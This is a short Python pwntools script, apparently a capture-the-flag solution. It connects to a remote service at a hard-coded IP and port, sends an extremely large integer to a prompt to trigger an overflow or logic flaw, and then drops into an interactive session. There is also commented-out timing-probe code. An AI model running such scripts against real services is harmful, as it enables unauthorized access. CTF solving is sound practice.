#!/usr/bin/python3

from pwn import *
import time
# exe = ELF('0', checksec=False)
# libc = ELF('0', checksec=False)
# context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''


                c
                ''')
                input()

# rop.write(7, 8, 9)
# find_gadget(['pop rdi, ret'])
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
res = 0
# for i in range(10):
#         p = remote('20.244.33.146', 4445, timeout = 1)
#         test1 = time.time()
#         sleep(0.0000006)
#         test2= time.time()
        
#         sla(b': ', '0')
        
#         p.recvuntil(b':  ')
#         tmp = float(p.recvline(keepends=False))
#         info("res: " + str(tmp))
#         # info("delta p: " + str(tmp/test))
#         info("res: " + str(test2-test1))
        
#         # res += tmp/test
#         p.close()
# res/=100

p = remote('20.244.33.146', 4445)
sla(b': ', str(1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001))
p.interactive()